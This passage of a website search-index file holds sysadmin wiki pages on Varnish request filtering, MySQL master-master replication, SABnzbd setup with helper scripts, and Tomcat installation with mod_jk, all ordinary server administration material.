host name of the request:\n... set req.backend = backend_s3; if(req.url == \"/ressources1.xml\") { set req.url = regsuball(req.http.host, \"^(?:.*[.])?([a-z]+)[.](?:net|com)$\", \"/ressource1.\\1.xml\"); }else if(req.url == \"/ressource2.txt\") { set req.url = regsuball(req.http.host, \"^(?:([a-z]+)[0-9]*[.])(?:([a-z]+)*[.])[a-z]+$\",\"/ressources.\\1.\\2.txt\"); } set req.http.host = \"resources.s3.amazonaws.com\"; backend backend_s3 { .host = \"ressources.s3.amazonaws.com\"; .port = \"80\"; .connect_timeout = 5s; .first_byte_timeout = 3s; .between_bytes_timeout = 2s; .max_connections = 1000; } ... Securing and HTTP Cleanup linkThe HTTP protocol allows using several types of methods (GET, POST, DELETE, etc.). These methods can be used in different ways to trigger specific actions (in the case of REST services) on services hosted on the backend servers. However, HTTP protection for this kind of service is quite tedious on the application server side. Varnish will allow us to precisely filter what should pass through and for what use. We will therefore limit side effects.\nImagine that we have a service accessible only in GET /service1/ and a second /service2/ accessible in GET and POST; we would write something like this:\n... if (req.request != \"GET\" \u0026\u0026 req.request != \"POST\"){ call error; } if (req.url ~ \"^/service2\"){ call service2; } if(req.request == \"POST\"){ call error; } if (req.url ~ \"^/service1\"){ call service1; } call error; ... In this example, we systematically forbid anything that is not a GET or POST method. Then for a URL that starts with /service2, we go to the routine that will process the payload for this service. Then we ban the POST method and we process URLs with /service1, and finally we ban the rest.\nWith this method, no unplanned request can reach a backend. We have two advantages:\nThe code to handle edge cases will be simpler. A majority of errors will not reach the backend, so they won’t cause any exceptions or saturation. In a second scenario, it may be interesting to normalize HTTP headers. Take the example of Accept-Encoding. Varnish recommends normalizing it like this:\n... if (req.http.Accept-Encoding) { if (req.http.Accept-Encoding ~ \"gzip\") { set req.http.Accept-Encoding = \"gzip\"; } elsif (req.http.Accept-Encoding ~ \"deflate\") { set req.http.Accept-Encoding = \"deflate\"; } else { remove req.http.Accept-Encoding; } } ... Simply to avoid creating different cache entries for the same payload just because all clients don’t write this header the same way.\nWe can also remove certain headers that might give too much information about the infrastructure. For S3 for example, we’ll pass these commands in the fetch:\n... unset beresp.http.x-amz-id-2; unset beresp.http.x-amz-request-id; unset beresp.http.x-amz-meta-s3cmd-attrs; unset beresp.http.x-amz-meta-s3fox-filesize; unset beresp.http.x-amz-meta-s3fox-modifiedtime; ... Or set more personal headers:\n... set beresp.http.Server = « ServerPerso »; ... The last little thing to think about for cleaning is setting a correct content-type for all resources. This operation is done in the same way as for cleaning headers by setting “set beresp.http.Content-Type” by resource group.\nThrough these features, Varnish is able to ensure the orchestration of high availability for an architecture. It can detect failing backends and even replace them by relying on its cache. It will protect them by handling a large part of 404 error management.\nStandardization of Access Logs linkThe “varnishd” process doesn’t produce any logs. It simply writes information to shared memory segments. These segments are consumed by tools like varnishadm, varnishlog, or varnishncsa. It’s mainly varnishncsa that interests us. This is the process that reads the information and creates a log file in NCSA format.\nThe advantage here is enormous. We can offload application servers and front HTTP from producing these logs. Moreover, these logs will be less scattered (although with the use of syslog-ng this isn’t a problem). Finally, the logs will all be standardized whether they are on Apache, Tomcat, JBoss, or even lighttp and NginX. We can therefore only think about what treatments we want to apply to them and no longer spend time reformatting everything. This consideration makes all the sense when you start reaching several gigabytes of access logs per day.\nSince version 3.0, Varnishncsa allows us to not follow the NCSA standard and leaves us the choice of output format.\nResources linkhttp://blog.bigdinosaur.org/adventures-in-varnish/\nhttp://decrypt.ysance.com/2012/02/le-web-accelere-avec-varnish/\nhttps://www.varnish-cache.org/trac/wiki/Performance\nhttp://kristianlyng.wordpress.com/2010/01/26/varnish-best-practices/\n"
            }
        );
    index.add(
            {
                id:  227 ,
                href: "\/Replication_Master_to_Master\/",
                title: "Replication Master to Master",
                description: "How to set up MySQL master-master replication for high-availability with step-by-step configuration guide and troubleshooting tips",
                content: " Introduction linkAfter completing the installation (See: Installation and Configuration), we are going to set up MySQL master-master replication. We need to replicate MySQL servers to achieve high-availability (HA). In my case I need two masters that are synchronized with each other so that if one of them goes down, the other could take over and no data is lost. Similarly, when the first one goes up again, it will still be used as slave for the live one.\nHere is a basic step by step tutorial, that will cover the MySQL master and slave replication and also will describe the MySQL master and master replication.\nNotions: we will call system 1 as master1 and slave2, and system2 as master2 and slave 1.\nInstall MySQL on master 1 and slave 1. Configure network services on both systems, like:\nMaster 1/Slave 2 IP: 10.8.0.1 Master 2/Slave 1 IP: 10.8.0.6 Master 1 configuration linkStep 1 linkOn Master 1, make changes in my.cnf:\n... [mysqld] log-bin=/var/log/mysql/mysql-bin.log binlog-do-db= # input the database which should be replicated binlog-ignore-db=mysql # input the database that should be ignored for replication binlog-ignore-db=test expire_logs_days=14 # binlog_cache_size = 64K # Enable this if binlog_cache_disk_use increase in 'show global status' sync_binlog = 1 # Reduce performances but essential for data integrity between slave \u003c- master slave_compressed_protocol = 1 # Good for wan replication to reduce network I/O at low cost of extra CPU server-id=1 bind-address = 0.0.0.0 ... Notes: Italic lines are nearly optional and bold lines need to be set\nIf you want to sync all databases without setting exclusions, you could do without adding ‘*ignore-db’ values:\n... [mysqld] log-bin=/var/log/mysql/mysql-bin.log expire_logs_days=14 # binlog_cache_size = 64K # Enable this if binlog_cache_disk_use increase in 'show global status' sync_binlog = 1 # Reduce performances but essential for data integrity between slave \u003c- master slave_compressed_protocol = 1 # Good for wan replication to reduce network I/O at low cost of extra CPU server-id=1 bind-address = 0.0.0.0 ... Restart MySQL:\n/etc/init.d/mysql restart Step 2 linkOn master 1, connect to it and create a replication slave account in MySQL:\nmysql\u003e create user 'replication'@'10.8.0.1' identified by 'password'; replication: username for replication password: password for replication user mysql\u003e grant replication slave on .* to 'replication'@'10.8.0.1'; or\nmysql\u003e grant replication slave on *.* to 'replication'@'10.8.0.1'; Flush the privileges and database tables with read lock:\nflush privileges; flush tables with read lock; show master status; +------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000173 | 50937 | wikidb | | +------------------+----------+--------------+------------------+ 1 row in set (0.00 sec) Note, if you have full InnoDB databases, you don’t need to flush tables with read locks.\nStep 3 linkBackup the desired database and upload them to the slave. If you’re on InnoDB:\nmysqldump -uroot -p --opt --add-drop-table --routines --triggers --events --single-transaction --master-data=2 -B wikidb \u003e wikidb.sql Note: If there is InnoDB/MyISAM, add –lock-all-tables!\nscp wikidb.sql 10.8.0.6:~/ Then we will unlock tables:\nmysql -uroot -p unlock tables; quit; Slave 1 configuration linkStep 1 linkLet’s create the database:\nmysql -uroot -p create database wikidb; quit; Then we import the database:\nmysql -uroot -p wikidb \u003c wikidb.sql Step 2 linkNow edit my.cnf on Slave1 or Master2:\n[mysqld] ... server-id=2 bind-address = 0.0.0.0 # sync_binlog = 1 expire_log_days = 14 ... Then restart MySQL:\n/etc/init.d/mysql restart Step 3 linkGrab information from the Master:\nhead -n100 database.sql Now we’re going to inform the slave database:\nmysql -uroot -p stop slave; reset slave; change master to master_host='10.8.0.1', master_user='replication', master_password='password', master_log_file='mysql-bin.000173', master_log_pos=50937; Let’s start the slave 1:\nstart slave; show slave status\\G; ************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.16.4 Master_User: replica Master_Port: 3306 Connect_Retry: 60 Master_Log_File: MASTERMYSQL01-bin.000009 Read_Master_Log_Pos: 4 Relay_Log_File: MASTERMYSQL02-relay-bin.000015 Relay_Log_Pos: 3630 Relay_Master_Log_File: MASTERMYSQL01-bin.000009 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 4 Relay_Log_Space: 3630 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 1519187 1 row in set (0.00 sec) The highlighted rows above must indicate related log files and Slave_IO_Running and Slave_SQL_Running must be set to YES.\nSeconds_Behind_Master: is the difference time between master and slave data sync (in progress…). Master_Host: This is the address of the master server. The slave will connect to it to get the logs that have to be replayed Master_User: The user that we will use for the replication Master_Port: The port where the slave will connect to on the master Master_Log_File: This file is the binary log that the slave will have to replay. The binary log is located on the master server. This file contains every statement that makes a change to the database in a binary format. Read_Master_Log_Pos: This is the position number on the binary log file that is being read by the “Slave_I/O Process” (the process that established the connection to the master and ensures the sync) Relay_Log_File: Same as the binary log but this file is located on the slave. This is a relay file of the master binary log Relay_Log_Pos: This is the position number on the relay log file that is being read by the “Slave_SQL Process” (the process that replays the changes to the slave database) Relay_Master_Log_File: It contains all the statements that have been processed by the slave. Slave_IO_Running: The status of the Slave_I/O process. When it’s “Yes” that means that the slave is properly connected to the master. If it’s “No” that means something is wrong with the connectivity between the 2 nodes Slave_SQL_Running: The status of the Slave_SQL process. When it’s “Yes” that means that the slave is able to process statements and that all is working correctly. If it’s “No” that means something is wrong while reading the relay logs Master 1 verification link mysql\u003e show master status; +------------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------------+----------+--------------+------------------+ |MysqlMYSQL01-bin.000008 | 410 | adam | | +------------------------+----------+--------------+------------------+ 1 row in set (0.00 sec) The above scenario is for master-slave, now we will create a slave master scenario for the same systems and it will work as master-master.\nMaster 2 configuration linkStep 1 linkOn Master 2, make changes in my.cnf:\n... [mysqld] log-bin=/var/log/mysql/mysql-bin.log binlog-do-db= # input the database which should be replicated binlog-ignore-db=mysql # input the database that should be ignored for replication binlog-ignore-db=test expire_logs_days=14 # binlog_cache_size = 64K # Enable this if binlog_cache_disk_use increase in 'show global status' sync_binlog = 1 # Reduce performances but essential for data integrity between slave \u003c- master slave_compressed_protocol = 1 # Good for wan replication to reduce network I/O at low cost of extra CPU server-id=2 bind-address = 0.0.0.0 # sync_binlog = 1 expire_log_days = 14 ... Restart MySQL:\n/etc/init.d/mysql restart Step 2 linkOn master 1, connect to it and create a replication slave account in MySQL:\nmysql\u003e create user 'replication'@'10.8.0.6' identified by 'password'; replication: username for replication password: password for replication user mysql\u003e grant replication slave on .* to 'replication'@'10.8.0.6'; or\nmysql\u003e grant replication slave on *.* to 'replication'@'10.8.0.6'; Flush the privileges:\nflush privileges; show master status; +------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000173 | 50937 | wikidb | | +------------------+----------+--------------+------------------+ 1 row in set (0.00 sec) Slave 1 configuration linkNow we’re going to inform the slave database:\nmysql -uroot -p slave stop; reset slave; change master to master_host='10.8.0.6', master_user='replication', master_password='password', master_log_file='mysql-bin.000173', master_log_pos=50937; Let’s start the slave 2:\nstart slave; show slave status\\G; ************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 10.8.0.6 Master_User: replica Master_Port: 3306 Connect_Retry: 60 Master_Log_File: MASTERMYSQL01-bin.000009 Read_Master_Log_Pos: 4 Relay_Log_File: MASTERMYSQL02-relay-bin.000015 Relay_Log_Pos: 3630 Relay_Master_Log_File: MASTERMYSQL01-bin.000009 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 4 Relay_Log_Space: 3630 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 1519187 1 row in set (0.00 sec) The highlighted rows above must indicate related log files and Slave_IO_Running and Slave_SQL_Running must be set to YES.\nMaster 2 verification link mysql\u003e show master status; +------------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------------+----------+--------------+------------------+ |MysqlMYSQL01-bin.000008 | 410 | adam | | +------------------------+----------+--------------+------------------+ 1 row in set (0.00 sec) The above scenario is for master-slave, now we will create a slave master scenario for the same systems and it will work as master-master.\nMonitoring linkNow you need to monitor your replication. You need to look at this when running ‘show slave status\\G’:\n... Slave_IO_Running: Yes Slave_SQL_Running: Yes Seconds_Behind_Master: 0 ... What is interesting to investigate are these lines:\n... Last_IO_Error: error connecting to master 'replication@192.168.25.9:3306' - retry-time: 60 retries: 86400 Last_SQL_Error: ... You also need to look at binlog size:\nmysql\u003e show global status like '%binlog%'; +------------------------+---------+ | Variable_name | Value | +------------------------+---------+ | Binlog_cache_disk_use | 2 | | Binlog_cache_use | 4333061 | | Com_binlog | 0 | | Com_show_binlog_events | 0 | | Com_show_binlogs | 14 | +------------------------+---------+ 5 rows in set (0.00 sec) Upgrade Binlog_cache_size from 32 to 128k if Binlog_cache_disk_use is not equal to 0.\nFAQ linkAfter a reboot the slave is not synchronized linkOn the master get information:\nmysql -uroot -p show master status; Try to do this on the slave (adapt to your configuration):\nmysql -uroot -p slave stop; reset slave; change master to master_host='10.8.0.6', master_user='replication', master_password='password', master_log_file='mysql-bin.000173', master_log_pos=50937; start slave; show slave status\\G; The slave synchronization should be repaired :-)\nWatch current process to determine syncro problem linkWith this command, we can see if there is a MySQL replication problem:\n$ mysqladmin -uroot -p processlist +------+-------------+------------------------+----+-------------+--------+-----------------------------------------------------------------------+------------------+ | Id | User | Host | db | Command | Time | State | Info | +------+-------------+------------------------+----+-------------+--------+-----------------------------------------------------------------------+------------------+ | 1 | system user | | | Connect | 264546 | Waiting for master to send event | | | 2 | system user | | | Connect | 1798 | Has read all relay log; waiting for the slave I/O thread to update it | | | 4796 | replication | 10.8.0.6:60523 | | Binlog Dump | 4733 | Has sent all binlog to slave; waiting for binlog to be updated | | | 5020 | root | localhost | | Query | 0 | | show processlist | +------+-------------+------------------------+----+-------------+--------+-----------------------------------------------------------------------+------------------+ What if I have binlogs corrupted? linkIf you’ve got this kind of problem, a tool called mk-table-checksum available here allows you to check consistency between 2 servers. It also can help to recreate a consistency database from the master.\nRepair replication linkYou may need to repair your replication because something went wrong and you can see that in the slave status (Last_Error). The way to correct the problem is to stop the slave:\nstop slave; Then analyze the error message and correct it on the slave. Then skip the error message:\nset global sql_slave_skip_counter=1; Then start the slave again:\nstart slave; All should now be ok :-)\nResources linkHere is another documentation if you encounter problems:\nMySQL Database Scale-out and Replication for High Growth Businesses (Very good documentation) Other MySQL masters replication documentation Master to Master replication MySQL 5 on Debian Etch Master to Master replication MySQL 5 on Fedora How To Repair MySQL Replication Setting Up Master-Master Replication On Four Nodes MariaDB MySQL Advanced "
            }
        );
    index.add(
            {
                id:  228 ,
                href: "\/SABnzbd_:_Une_interface_web_pour_g%C3%A9rer_les_newsgroups\/",
                title: "SABnzbd: A Web Interface for Managing Newsgroups",
                description: "How to setup SABnzbd, a web interface for managing newsgroups downloads on Debian systems",
                content: " Operating System Debian 6/7 Website Sabnzbd Website Last Update 19/06/2013 Introduction linkYou may not want to have heavy software running on your machine for newsgroups. That’s when a friend told me about SABnzbd. After looking at how it works, it turns out that it’s particularly powerful.\nI decided to write a small documentation for setting it up on Debian Squeeze.\nInstallation linkHere’s the minimum to install for Debian 6:\naptitude install python-cheetah python-pyopenssl python-yenc For Debian 7:\naptitude install python-cheetah python-openssl python-yenc Then we’ll install SABnzbd:\ncd /var/www wget \"http://downloads.sourceforge.net/project/sabnzbdplus/sabnzbdplus/sabnzbd-0.6.15/SABnzbd-0.6.15-src.tar.gz?r=http%3A%2F%2Fsabnzbd.org%2Fdownload%2F\u0026ts=1332934860\u0026use_mirror=freefr\" -o sab.tgz tar -xzf sab.tgz mv SABnzbd-0.6.15 sabnzbd cd sabnzbd Configuration linkApache linkYou may not want to have to type another port to access the web interface. The goal is to put it behind Apache which will redirect requests itself. First, we need to activate the Apache proxy module:\naptitude install apache2 apache2-utils apache2.2-common libapache2-mod-proxy-html Then activate modules:\na2enmod proxy_connect a2enmod proxy_http a2enmod proxy_html And restart Apache.\nHere’s the configuration to apply and adapt to your needs:\n[...] order deny,allow deny from all allow from all ProxyPass http://localhost:8080/sabnzbd ProxyPassReverse http://localhost:8080/sabnzbd Launch linkTo start the server:\npython ./SABnzbd.py -d Then connect to http://localhost/SABnzbd (or http://localhost:8080/SABnzbd if you haven’t set up Apache) and configure as you wish.\nPost-processing Scripts linkYou might want an action to happen automatically after each download. In my case, I want the files present to not stay more than 15 days. So I have a script that cleans up, which I placed in crontab:\n#!/bin/sh folder=\"/mnt/sabnzbd/downloads\" max_day=15 for user in `ls $folder/` ; do cd $folder find . -mtime +$max_day ! -name '.' ! -exec rm -f {} \\; find . -type d ! -name '.' ! -name '..' -exec rmdir {} \\; done The problem is that it removes files that were created more than 15 days ago but that I downloaded less than 15 days ago.\nExample: I download an Ubuntu ISO that is 5 months old. It’s in a compressed file (zip for example) that I download, Sabnzbd takes care of decompressing it, but the final file dates from 5 months ago and not from the date of decompression. So we need a solution to modify the file date to today. Let’s create a scripts folder for example:\nmkdir -p /etc/scripts/sabnzbd Then we’ll add a post-processing script:\n#!/bin/sh tmp_renamed_folder=`echo \"$1\" | perl -pe 's/\\ |-/_/g'` renamed_folder=`echo \"$tmp_renamed_folder\" | perl -pe 's/_+/_/g'` mv \"$1\" $renamed_folder 2\u003e/dev/null find $renamed_folder -exec touch {} \\; exit 0 This script renames folders containing a - or spaces with _. And it concatenates multiple _ into a single one. Then it changes the date of files and folders. Why do this when renaming options are available directly in SABnzbd? Simply because these operations are done when importing an nzb and not when renaming. But since it causes problems for the find command, I chose to do renaming.\nSet the proper permissions:\nchmod 755 /etc/scripts/sabnzbd/postscript.sh To understand how it works, I invite you to read this link1\nThen, configure Sabnzbd (from the web interface) so it knows where your scripts are and uses them automatically:\nConfiguration -\u003e Directories -\u003e Post-Processing Scripts Folder -\u003e /etc/scripts/sabnzbd Configuration -\u003e Categories -\u003e Default -\u003e Script -\u003e postscript.sh And there you go :-). Your downloads will be post-processed and will have the date and time of the end of the file download :-)\nImproving Performance linkSabnzbd linkBy default, downloading and yencode happens on disk. It is possible to do everything in RAM. Obviously this consumes RAM, but the difference in speed is phenomenal! That means you will at least double the performance! Personally, I quadrupled the download speeds :-). Here’s how I did it, go to the graphical interface then: Configuration -\u003e General -\u003e Settings -\u003e Article Cache Limit -\u003e 250M\nSystem linkAt the system level, check out the optimization of extX filesystems and RAID under Linux\nThird-party Tools linkFirefox linkI recommend nzbdStatus for Firefox and SABMobile for iPhone or for Android.\nsabnzbd_api.py linkI wrote a Python script to work with the API provided by Sabnzbd. I created it with the idea that it should be easy to add functionality via the API. This script allows:\nTo see the elements provided by the XML API To delete a certain number of elements in the history Here’s the script. Edit the beginning of the script and insert the URL, as well as the API key:\n#!/usr/bin/env python # Made by Deimos # Under GPL2 licence # Set Sabnzbd URL sabnzbd_url = 'http://127.0.0.1:8080/sabnzbd' # Set Sabnzbd API sabnzbd_api = '2d872eb6257123a9579da906b487e1de' ############################################################# # Load modules import argparse from urllib2 import Request, urlopen, URLError from lxml import etree import sys def Debug(debug_text): \"\"\"Debug function\"\"\" if debug_mode == True: print debug_text def args(): \"\"\"Command line parameters\"\"\" # Define globla vars global sabnzbd_url, sabnzbd_api, debug_mode, mode, keep_history # Main informations parser = argparse.ArgumentParser(description=\"Sabnzbd API usage in python\") subparsers = parser.add_subparsers(title='Available sub-commands', help='Choose a subcommand (-h for help)', description='Set a valid subcommand', dest=\"subcmd_name\") # Default args parser.add_argument('-u', '--url', action='store', dest='url', type=str, default=sabnzbd_url, help='Set Sabnzbd URL (default : %(default)s)') parser.add_argument('-a', '--api', action='store', dest='api', type=str, default=sabnzbd_api, help='Set Sabnzbd API key') parser.add_argument('-v', '--version', action='version', version='v0.1 Licence GPLv2', help='Version 0.1') parser.add_argument('-d', '--debug', action='store_true', default=False, help='Debug mode') # Show XML API parser_xa = subparsers.add_parser('xa', help='Show XML Elements from API') # Delete history parser_dh = subparsers.add_parser('dh', help='Delete old history') parser_dh.add_argument('-k', '--keep', action='store', dest='num', type=int, default=150, help='Number of items to keep in history (default : %(default)s)') result = parser.parse_args() # Set debug to True if requested by command line if (result.debug == True): debug_mode=True else: debug_mode=False # Send debug informations Debug('Command line : ' + str(sys.argv)) Debug('Command line vars : ' + str(parser.parse_args())) # Check defaults options if result.url != sabnzbd_url: sabnzbd_url = result.url elif result.api != sabnzbd_api: sabnzbd_api = result.api # Managing options mode=result.subcmd_name if (mode == 'dh'): keep_history=result.num def GetSabUrl(sabnzbd_url, sabnzbd_api): \"\"\"Concat Sabnzbd URL Check that the connection to URL is correct and TCP is OK\"\"\" # Concat sab_url = sabnzbd_url + '/api?mode=history\u0026output=xml\u0026apikey=' + sabnzbd_api Debug('Concatened Sabnzbd URL : ' + str(sab_url)) # Connectivity test request = Request(sab_url) try: response = urlopen(request) except URLError, e: if hasattr(e, 'reason'): print 'Can\\'t connect to server : ' + str(e.reason) sys.exit(1) elif hasattr(e, 'code'): print 'The server couldn\\'t fulfill the request.' + str(e.code) sys.exit(1) else: Debug('Sabnzbd TCP connection OK') return sab_url def GetXmlHistory(sab_url): \"\"\"Get XML nzo_id entries\"\"\" xml_history = [] # Parse XML from given url xml_content = etree.parse(sab_url) # Select only the wished tag and push it in xml_history list for node in xml_content.xpath(\"///*\"): if (node.tag == 'nzo_id'): # Reencode value to avoid errors tag_value = unicode(node.text).encode('utf8') #Debug(node.tag + ' : ' + tag_value) xml_history.append(tag_value) Debug('XML history has ' + str(len(xml_history)) + ' entries') # If there were no entry in the list, check if the API failed if len(xml_history) == 0: Debug('Checking why there is no datas') xml_content = etree.parse(sab_url) for node in xml_content.xpath(\"//*\"): if (node.tag == 'error'): print 'Can\\'t connect to server : ' + unicode(node.text).encode('utf8') sys.exit(1) return xml_history def DeleteHistory(xml_history,keep_history): \"\"\"Delete old history\"\"\" # Create a new list contaning elements to remove elements2delete = [] element_number=1 for element in xml_history: if element_number \u003e keep_history: elements2delete.append(element) element_number += 1 queue_elements2remove=','.join(elements2delete) Debug('Elements to delete (' + str(len(xml_history)) + ' - ' + str(keep_history) + ' = ' + str(len(elements2delete)) + ')') # Concat URL with elements to remove and then remove sab_url_remove = sabnzbd_url + '/api?mode=history\u0026name=delete\u0026value=' + queue_elements2remove + '\u0026apikey=' + sabnzbd_api urlopen(sab_url_remove) def ShowXMLElements(sab_url): \"\"\"Show XML code from URL\"\"\" xml_content = etree.parse(sab_url) for node in xml_content.xpath(\"//*\"): print node.tag + ' : ' + unicode(node.text).encode('utf8') def main(): \"\"\"Main function that launch all of them\"\"\" # Set args and get debug mode args() # Get Sabnzbd URL and check connectivity sab_url = GetSabUrl(sabnzbd_url, sabnzbd_api) # Delete old history if mode == 'dh': xml_history = GetXmlHistory(sab_url) DeleteHistory(xml_history,keep_history) elif mode == 'xa': ShowXMLElements(sab_url) if __name__ == \"__main__\": main() For the usage part, it’s divided into 2:\nThe main commands The subcommands (requested functions) Here’s how to use it:\n\u003e sabnzbd_api.py -h usage: sabnzbd_api.py [-h] [-u URL] [-a API] [-v] [-d] {xa,dh} ... Sabnzbd API usage in python optional arguments: -h, --help show this help message and exit -u URL, --url URL Set Sabnzbd URL (default : http://127.0.0.1:8080/sabnzbd) -a API, --api API Set Sabnzbd API key -v, --version Version 0.1 -d, --debug Debug mode Available sub-commands: Set a valid subcommand {xa,dh} Choose a subcommand (-h for help) xa Show XML Elements from API dh Delete old history To use the dh subcommand that allows you to delete history:\n\u003e sabnzbd_api.py dh -h usage: sabnzbd_api.py dh [-h] [-k NUM] optional arguments: -h, --help show this help message and exit -k NUM, --keep NUM Number of items to keep in history (default : 150) Here, if I remove -h, it will delete the history queue larger than 150 entries.\nReferences link http://wiki.sabnzbd.org/user-scripts ↩︎\n"
            }
        );
    index.add(
            {
                id:  229 ,
                href: "\/Tomcat_:_Mise_en_place_d\u0027un_serveur_Tomcat\/",
                title: "Tomcat: Setting up a Tomcat server",
                description: "Learn how to install, configure, and manage Tomcat server including advanced features like load balancing, clustering, and monitoring options.",
                content: " Software version 5.5/6/7 Operating System Debian 6 Website Tomcat Website Last Update 17/06/2013 Introduction linkApache Tomcat is a J2EE servlet container. Originating from the Jakarta project, Tomcat is now a main project of the Apache Foundation. Tomcat implements Sun Microsystems’ servlet and JSP specifications. It includes tools for configuration and management, but can also be configured by editing XML configuration files. Since Tomcat includes an internal HTTP server, it is also considered an HTTP server. Tomcat is also considered an application server.\nInstallation linkAs usual, on Debian, it’s very simple:\naptitude install tomcat5.5 If you get a message like this:\nErrors were encountered during execution: tomcat5.5 E: Sub-process /usr/bin/dpkg returned an error code (1) Installation of package failed. Attempting to recover: Setting up tomcat5.5 (5.5.20-2) ... Starting Tomcat servlet engine: tomcat5.5invoke-rc.d: initscript tomcat5.5, action \"start\" failed. dpkg: error processing tomcat5.5 (--configure): the post-installation script returned an exit status error code 1 Errors were encountered during execution: tomcat5.5 Press Enter to continue. Then you’ll need to analyze the logs:\n\u003e tail /var/lib/tomcat5.5/logs/catalina_`date +%Y-%m-%d`.log The java-gcj-compat-dev environment currently doesn't support a security manager. Please check the TOMCAT5_SECURITY variable in /etc/default/tomcat5.5. Using CATALINA_BASE: /var/lib/tomcat5.5 Using CATALINA_HOME: /usr/share/tomcat5.5 Using CATALINA_TMPDIR: /var/lib/tomcat5.5/temp Using JRE_HOME: /usr/lib/jvm/java-gcj The java-gcj-compat-dev environment currently doesn't support a security manager. Please check the TOMCAT5_SECURITY variable in /etc/default/tomcat5.5. I think that’s clear enough. We need to edit the /etc/default/tomcat5.5 file to replace:\nTOMCAT5_SECURITY=yes with:\nTOMCAT5_SECURITY=no Of course, this involves some risks (I won’t pretend to know what they are and haven’t had time to look into the issue). Now let’s restart the installation:\napt-get install tomcat5.5 And for those who want to install the admin tools:\napt-get install tomcat5.5-admin Configuration linkTomcat is quite complex in its configuration. That’s why good explanations are always helpful1.\nModifying Tomcat Environment Variables linkYou may need to adjust Tomcat’s Xmx or Xms settings. Edit the file /etc/default/tomcat5.5:\n# Run Tomcat as this user ID. Not setting this or leaving it blank will use the # default of tomcat55. TOMCAT5_USER=tomcat55 # The home directory of the Java development kit (JDK). You need at least # JDK version 1.4. If JAVA_HOME is not set, some common directories for # the Sun JDK, various J2SE 1.4 versions, and the free runtimes # java-gcj-compat-dev and kaffe are tried. JAVA_HOME=/usr/lib/jvm/java-6-sun # Directory for per-instance configuration files and webapps. It contain the # directories conf, logs, webapps, work and temp. See RUNNING.txt for details. # Default: /var/lib/tomcat5.5 #CATALINA_BASE=/var/lib/tomcat5.5 # Arguments to pass to the Java virtual machine (JVM). JAVA_OPTS=\"-Djava.awt.headless=true -Xms512m -Xmx512m\" # Java compiler to use for translating JavaServer Pages (JSPs). You can use all # compilers that are accepted by Ant's build.compiler property. #JSP_COMPILER=jikes # Use the Java security manager? (yes/no, default: yes) # WARNING: Do not disable the security manager unless you understand # the consequences! # NOTE: java-gcj-compat-dev currently doesn't support a security # manager. TOMCAT5_SECURITY=no For security reasons, uncomment the TOMCAT5_USER line as shown above.\nRedirecting Logs linkTo redirect Tomcat logs, please follow this documentation.\nGiving Access to Admin Interfaces linkTo access the manager and admin interfaces, you’ll need to edit the users configuration file:\n\u003c?xml version='1.0' encoding='utf-8'?\u003e Adapt it according to the logins and passwords you want to use.\nYou can then access via the following links (adapting as needed):\nmanager: http://localhost:8180/manager/html admin: http://localhost:8180/admin Changing the Java Version linkTo change the default Java version (version 6 in this example):\nupdate-java-alternatives -s java-6-sun Make sure you have this line in the tomcat default file:\n... JAVA_HOME=/usr/lib/jvm/java-6-sun ... mod_jk linkIt’s sometimes useful to redirect Apache to Tomcat to simplify the URL for end users and allow Tomcat to not manage connections directly. You can also use mod_proxy (which is increasingly being used instead of mod_jk).\nInstall Apache and mod_jk:\naptitude install apache2 libapache2-mod-jk Then edit the workers.properties file:\nworkers.tomcat_home=/usr/share/tomcat6 workers.java_home=/usr/lib/jvm/default-java ps=/ worker.list=ajp13_worker,jk-status,jk-manager,examples worker.ajp13_worker.port=8009 worker.ajp13_worker.host=localhost worker.ajp13_worker.type=ajp13 worker.examples.port=8009 worker.examples.host=localhost worker.examples.type=ajp13 worker.jk-status.read_only=True worker.jk-status.type=status worker.jk-manager.type=status #worker.ajp13_worker.lbfactor=1 #worker.loadbalancer.type=lb #worker.loadbalancer.balance_workers=ajp13_worker I’ve added ajp13 with the connector information. Now let’s uncomment it in the Tomcat configuration:\n[...] [...] Restart Tomcat for this configuration to take effect. Now, let’s configure Apache:\na2enmod mod_jk touch /etc/apache2/mods-available/jk.conf cd /etc/apache2/mods-enabled/ ln -s /etc/apache2/mods-available/jk.conf . Then let’s edit this configuration file to tell it about the workers.properties file:\nJkWorkersFile /etc/libapache2-mod-jk/workers.properties JkShmFile /var/log/apache2/mod_jk.shm JkLogFile /var/log/apache2/mod_jk.log JkLogLevel info Finally, let’s modify the VirtualHost to tell it to use mod_jk:\nServerAdmin webmaster@localhost DocumentRoot /var/www JkMountCopy\tOn JkMount\t/docs/* ajp13_worker JkUnMount\t/docs/*.gif ajp13_worker JkMount /examples/* examples #JkMount /jk-status/* jk-status JkMount jk-status Order deny,allow Deny from all Allow from 127.0.0.1 #JkMount /jk-manager/* jk-manager JkMount jk-manager Order deny,allow Deny from all Allow from 127.0.0.1 Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ "
            }
        );
    index.add(
